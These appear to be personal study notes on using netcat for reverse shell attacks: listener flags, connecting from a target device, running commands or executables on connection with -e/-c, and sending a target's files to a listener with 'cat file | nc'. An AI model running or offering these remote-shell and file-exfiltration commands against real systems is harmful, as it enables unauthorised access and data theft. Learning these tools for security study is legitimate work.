- Uses the command 
	EG.
		nc

- Used for connections where the machines are on the same network.


					WORKING
					========
- When conducting reverse shell attacks we do not connect to a machine we wait for the machine to connect to us. To do this we need to create a listener to listen for a connection to our machine on a certain port that we are going to specify.
	EG.
		nc -lnvp 87  -->  nc -lnvp <port number>

			-l :- Listen mode for inbound connects.

			-n :- Numeric-only ip addresses, no dns.

			-v :- verbose. will give us all the info. 

			-p :- local port number.


	   nc 192.168.0.1 87 --> nc <ip of the listening machine> <port the listenning machine is listening to>
	               
	               - On the attacked device we create a nc connection.
	               
	               - This will only send messages like chats between the target and the listener.
	              
	              
        ** EXECUTING COMMANDS / REVERSE SHELL **
we can also execute commands on the listener:
        nc -lnvp 87 -e ./path/to/executable
            OR
        nc -lnvp 87 -c commandToRun
            
                - this will run a specific executable or command when the target connects to the listener.
                
                - the output will be on the target device.


        ** TRANSFERING FILES **
we can transfer the files from the target to the listener by :
        nc -lnvp 87 > storeRecievedContent.txt --> nc -lnvp <port number> > <file to store received data>
            
                -this will store any file data send from the target in the file specified.
                

       cat file | nc 192.168.0.1 87 --> cat <file to send> | nc <ip of the listening machine> <port of listener>
        
                - this will send the contents of file to the listener.
